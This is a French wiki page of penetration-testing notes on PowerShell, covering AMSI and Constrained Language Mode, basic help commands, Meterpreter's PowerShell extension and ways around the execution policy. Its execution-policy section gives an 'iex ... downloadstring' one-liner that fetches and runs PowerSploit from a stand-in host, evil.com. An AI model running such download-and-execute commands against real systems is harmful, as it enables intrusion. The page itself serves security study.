---
title: Powershell
permalink: /Powershell/
---

Généralités
-----------

- powershell.exe n'est pas "Powershell" mais juste une interface pour intéragir avec. Il est possible d'utiliser d'autres interfaces comme **Not Powershell** (https://github.com/Ben0xA/nps) ou **PSAttack** (https://github.com/jaredhaight/PSAttack)
- Il est possible d'activer le logging pour Powershell.
- (Powershell v5): Constrained Powershell Enforced (lié à DeviceGuard) permet de bloquer certaines fonctionnalités de powershell (notamment celles utilisées par Invoke-Mimikatz). Cependant ceci est limité à **powershell.exe**.
- (Windows 10): [Anti malware Scan Interface](https://msdn.microsoft.com/fr-fr/library/windows/desktop/dn889587(v=vs.85).aspx) fournit une interface pour les antivirus qui permet notamment de faciliter l'analyse AV en mémoire.
   - Il existe des méthodes pour bypasser AMSI.
   - La plupart des AV ne supportent pas AMSI.
- (Windows 10): [Just Enough Administration](/Just_Enough_Administration/)


Commandes
---------

Obtenir de l'aide en powershell:

``` powershell
Get-Help Get-Command # Obtenir de l'aide sur Get-Command
Get-Help Get-Command -examples # Affiche les examples
Get-Help Get-Command -full # Affiche toute l'aide
Get-Help Get-Command -Parameter * # Affiche les paramétres
Get-Command Out* # Renvoie toutes les commandes dont le nom contient Out*
```

Pour faire des boucles:

``` powershell
Get-Process | ForEach-Object {$_.Name} # Boucle sur chaque résultat de la commande Get-Process et renvoie le nom
```

Pour faire du formatting / output:

``` powershell
Get-Process | Format-List -Property Threads, SessionId # Affiche le résultat sous forme de liste en se limitant à certaines informations
```

Meterpreter
-------------------

Il est possible d'utiliser powershell à partir d'un meterpreter:
```
load powershell
```

Voir [Meterpreter New Windows PowerShell Extension](http://www.darkoperator.com/blog/2016/4/2/meterpreter-new-windows-powershell-extension)

Execution Policy
----------------

Il est possible de contourner l'execution policy ("\[...\] running scripts is disabled on this system."):

``` powershell
iex (new-object net.webclient).downloadstring('file:///C:\\Tools\\Powersploit\\Powersploit.psd1')
iex (new-object net.webclient).downloadstring('https://evil.com/powersploit.psd1')
```

-   Si powershell.exe est bloqué: il est possible d'utiliser **Not Powershell** (https://github.com/Ben0xA/nps)

Il est très important de comprendre que l'execution policy n'est pas un mécanisme de sécurité ! (Microsoft le dit lui-même)

Commandes utiles
----------------

Les commandes suivantes sont utiles à connaître lors de l'utilisation de Powershell:

Resources
---------

-  [PowerUp: A Usage Guide](http://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/)
-  [PwnWiki](http://pwnwiki.io/#!scripting/powershell.md)
-  [DerbyCon - PowerShell Secrets and Tactics](https://www.youtube.com/watch?v=mPPv6_adTyg)
-  [PowerShell Security: Defending the Enterprise from the Latest Attack Platform](https://www.youtube.com/watch?v=_8yBjg7bRLo)
